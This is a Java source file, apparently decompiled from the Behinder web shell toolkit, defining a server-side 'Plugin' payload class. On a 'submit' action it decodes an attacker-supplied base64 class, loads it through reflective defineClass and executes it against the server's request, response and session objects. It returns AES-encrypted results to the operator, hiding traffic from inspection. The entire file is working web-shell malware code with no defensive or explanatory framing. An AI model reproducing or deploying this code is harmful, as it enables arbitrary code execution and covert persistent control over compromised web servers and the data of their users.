package net.rebeyond.behinder.payload.java;

import java.lang.reflect.Method;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

public class Plugin {
   public static String taskID;
   public static String action;
   public static String payload;
   private Object Request;
   private Object Response;
   private Object Session;

   public boolean equals(Object obj) {
      HashMap result = new HashMap();

      try {
         this.fillContext(obj);
      } catch (Exception var46) {
         result.put("msg", var46.getMessage());
         result.put("status", "fail");
         return true;
      }

      if (action.equals("submit")) {
         ClassLoader classLoader = this.getClass().getClassLoader();
         Class urlClass = ClassLoader.class;
         boolean var39 = false;

         Object so;
         Method write;
         label230: {
            try {
               var39 = true;
               Method method = urlClass.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
               method.setAccessible(true);
               byte[] payloadData = this.base64decode(payload);
               Class payloadCls = (Class)method.invoke(classLoader, payloadData, 0, payloadData.length);
               Object payloadObj = payloadCls.newInstance();
               Method payloadMethod = payloadCls.getDeclaredMethod("execute", Object.class, Object.class, Object.class);
               payloadMethod.invoke(payloadObj, this.Request, this.Response, this.Session);
               result.put("msg", "任务提交成功");
               result.put("status", "success");
               var39 = false;
               break label230;
            } catch (Exception var47) {
               result.put("msg", var47.getMessage());
               result.put("status", "fail");
               var39 = false;
            } finally {
               if (var39) {
                  try {
                     so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
                     write = so.getClass().getMethod("write", byte[].class);
                     write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
                     so.getClass().getMethod("flush").invoke(so);
                     so.getClass().getMethod("close").invoke(so);
                  } catch (Exception var41) {
                  }

               }
            }

            try {
               so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
               write = so.getClass().getMethod("write", byte[].class);
               write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
               so.getClass().getMethod("flush").invoke(so);
               so.getClass().getMethod("close").invoke(so);
            } catch (Exception var44) {
            }

            return true;
         }

         try {
            so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
            write = so.getClass().getMethod("write", byte[].class);
            write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
            so.getClass().getMethod("flush").invoke(so);
            so.getClass().getMethod("close").invoke(so);
         } catch (Exception var45) {
         }
      } else if (action.equals("getResult")) {
         boolean var27 = false;

         Object so;
         Method write;
         label231: {
            try {
               var27 = true;
               Map taskResult = (Map)this.sessionGetAttribute(this.Session, taskID);
               Map temp = new HashMap();
               temp.put("running", taskResult.get("running"));
               temp.put("result", this.base64encode((String)taskResult.get("result")));
               result.put("msg", this.buildJson(temp, false));
               result.put("status", "success");
               var27 = false;
               break label231;
            } catch (Exception var49) {
               result.put("msg", var49.getMessage());
               result.put("status", "fail");
               var27 = false;
            } finally {
               if (var27) {
                  try {
                     so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
                     write = so.getClass().getMethod("write", byte[].class);
                     write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
                     so.getClass().getMethod("flush").invoke(so);
                     so.getClass().getMethod("close").invoke(so);
                  } catch (Exception var40) {
                  }

               }
            }

            try {
               so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
               write = so.getClass().getMethod("write", byte[].class);
               write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
               so.getClass().getMethod("flush").invoke(so);
               so.getClass().getMethod("close").invoke(so);
            } catch (Exception var42) {
            }

            return true;
         }

         try {
            so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
            write = so.getClass().getMethod("write", byte[].class);
            write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
            so.getClass().getMethod("flush").invoke(so);
            so.getClass().getMethod("close").invoke(so);
         } catch (Exception var43) {
         }
      }

      return true;
   }

   private byte[] Encrypt(byte[] bs) throws Exception {
      String key = this.Session.getClass().getMethod("getAttribute", String.class).invoke(this.Session, "u").toString();
      byte[] raw = key.getBytes("utf-8");
      SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
      Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
      cipher.init(1, skeySpec);
      byte[] encrypted = cipher.doFinal(bs);
      return encrypted;
   }

   private String buildJson(Map entity, boolean encode) throws Exception {
      StringBuilder sb = new StringBuilder();
      String version = System.getProperty("java.version");
      sb.append("{");
      Iterator var5 = entity.keySet().iterator();

      while(var5.hasNext()) {
         String key = (String)var5.next();
         sb.append("\"" + key + "\":\"");
         String value = ((String)entity.get(key)).toString();
         if (encode) {
            Class Base64;
            Object Encoder;
            if (version.compareTo("1.9") >= 0) {
               this.getClass();
               Base64 = Class.forName("java.util.Base64");
               Encoder = Base64.getMethod("getEncoder", (Class[])null).invoke(Base64, (Object[])null);
               value = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
            } else {
               this.getClass();
               Base64 = Class.forName("sun.misc.BASE64Encoder");
               Encoder = Base64.newInstance();
               value = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
               value = value.replace("\n", "").replace("\r", "");
            }
         }

         sb.append(value);
         sb.append("\",");
      }

      if (sb.toString().endsWith(",")) {
         sb.setLength(sb.length() - 1);
      }

      sb.append("}");
      return sb.toString();
   }

   private String base64encode(String clearText) throws Exception {
      String result = "";
      String version = System.getProperty("java.version");
      Class Base64;
      Object Encoder;
      if (version.compareTo("1.9") >= 0) {
         this.getClass();
         Base64 = Class.forName("java.util.Base64");
         Encoder = Base64.getMethod("getEncoder", (Class[])null).invoke(Base64, (Object[])null);
         result = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, clearText.getBytes("UTF-8"));
      } else {
         this.getClass();
         Base64 = Class.forName("sun.misc.BASE64Encoder");
         Encoder = Base64.newInstance();
         result = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, clearText.getBytes("UTF-8"));
         result = result.replace("\n", "").replace("\r", "");
      }

      return result;
   }

   private byte[] base64decode(String base64Text) throws Exception {
      String version = System.getProperty("java.version");
      byte[] result;
      Class Base64;
      Object Decoder;
      if (version.compareTo("1.9") >= 0) {
         this.getClass();
         Base64 = Class.forName("java.util.Base64");
         Decoder = Base64.getMethod("getDecoder", (Class[])null).invoke(Base64, (Object[])null);
         result = (byte[])((byte[])Decoder.getClass().getMethod("decode", String.class).invoke(Decoder, base64Text));
      } else {
         this.getClass();
         Base64 = Class.forName("sun.misc.BASE64Decoder");
         Decoder = Base64.newInstance();
         result = (byte[])((byte[])Decoder.getClass().getMethod("decodeBuffer", String.class).invoke(Decoder, base64Text));
      }

      return result;
   }

   private void fillContext(Object obj) throws Exception {
      if (obj.getClass().getName().indexOf("PageContext") >= 0) {
         this.Request = obj.getClass().getMethod("getRequest").invoke(obj);
         this.Response = obj.getClass().getMethod("getResponse").invoke(obj);
         this.Session = obj.getClass().getMethod("getSession").invoke(obj);
      } else {
         Map objMap = (Map)obj;
         this.Session = objMap.get("session");
         this.Response = objMap.get("response");
         this.Request = objMap.get("request");
      }

      this.Response.getClass().getMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
   }

   private Object sessionGetAttribute(Object session, String key) {
      Object result = null;

      try {
         result = session.getClass().getMethod("getAttribute", String.class).invoke(session, key);
      } catch (Exception var5) {
      }

      return result;
   }

   private void sessionSetAttribute(Object session, String key, Object value) {
      try {
         session.getClass().getMethod("setAttribute", String.class, Object.class).invoke(session, key, value);
      } catch (Exception var5) {
      }

   }

   private Enumeration sessionGetAttributeNames(Object session) {
      Enumeration result = null;

      try {
         result = (Enumeration)session.getClass().getMethod("getAttributeNames").invoke(session);
      } catch (Exception var4) {
      }

      return result;
   }

   private void sessionRemoveAttribute(Object session, String key) {
      try {
         session.getClass().getMethod("removeAttribute").invoke(session, key);
      } catch (Exception var4) {
      }

   }
}
